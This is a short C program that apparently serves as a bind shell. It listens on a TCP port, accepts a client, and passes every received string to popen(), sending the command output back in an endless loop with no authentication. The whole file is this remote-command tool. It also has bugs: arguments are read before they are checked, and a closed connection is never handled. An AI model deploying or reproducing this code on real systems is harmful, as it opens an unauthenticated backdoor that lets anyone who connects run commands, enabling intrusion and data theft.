#include <stdio.h> // for "printf()"
#include <stdlib.h> // for "atoi()"
#include <string.h> // for "bzero()"
#include <unistd.h> // for "close()"
#include <sys/socket.h> // for "socket(), connect(), send() and recv()"
#include <arpa/inet.h> // for "sockaddr_in and inet_addr()"

#define MAXSIZE 9192 

int main(int argc, char *argv[]){

	// Initialization of IP address & port number
	int port = atoi(argv[1]);
	char *ip = argv[2];

	// Declaration of variables for the exchange
	char cmd[MAXSIZE];
	char buffer[MAXSIZE];
	char strings_msg[MAXSIZE+1];
	FILE *output;

	// Declaration of variables for the socket programming
	int server_socket, client_socket, binding;
	struct sockaddr_in server_addr, client_addr;
	int n, len;

	// Inititialization of variables used for the network
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	server_addr.sin_addr.s_addr = inet_addr(ip);


	// Check if the user put the arguments
	if (argc != 3) {
         printf("You need to specify port number and IP address ! \n");
         exit(1);
     }
	
	// Initialization of the socket
	server_socket = socket(AF_INET, SOCK_STREAM, 0);

	if (server_socket < 0){
		perror ("[-] Socket error");
		exit (1);
	}

	printf("[+] Server started. \n");

	// Bind the server with the port number and the IP address specify
	binding = bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));

	if (binding < 0){
		perror("[-] Bind error ");
		exit(1);
	}

	else {
		printf("[+] Bind to port number : %d | IP address : %s \n", port, ip);

		// Listening for the client connect()...
		n = listen(server_socket,1);

		if(n<0){
			printf("Error during listen()\n");
			exit(0);
		}

		printf("listening... \n");

		// Accept the connection with the client
		len = sizeof(client_addr);
		client_socket = accept(server_socket, (struct sockaddr*)&client_addr,&len);

		if(client_socket < 0){
			printf("Error during accept()\n");
			exit(0);
		}

		printf("[+] Client connected from %s ! \n",inet_ntoa(client_addr.sin_addr));
	}

	// Infinite loop for exchange between Client & Server
	while(1){

		// Put the value of the memory at 0
		bzero(cmd,MAXSIZE);
		bzero(buffer,MAXSIZE);

		// Receive and convert the socket from the client
		int bytes_of_socket  = recv(client_socket, cmd, sizeof(cmd),0);
		strncpy(strings_msg, cmd, bytes_of_socket);
		strings_msg[bytes_of_socket] = '\0';

		// Execute bash command & create an output of this command
		output = popen (strings_msg, "r");
		if (output == NULL){
			fputs("[+] Connection with client closed ! \n", stderr);
			close(server_socket);
			exit(0);
		}

		// Send to the client the result of the command
		while (fgets(buffer, MAXSIZE-1, output) != NULL){
			send(client_socket, buffer, strlen(buffer), 0);
			sleep(0.01);
		}
	}

	return 0;
}
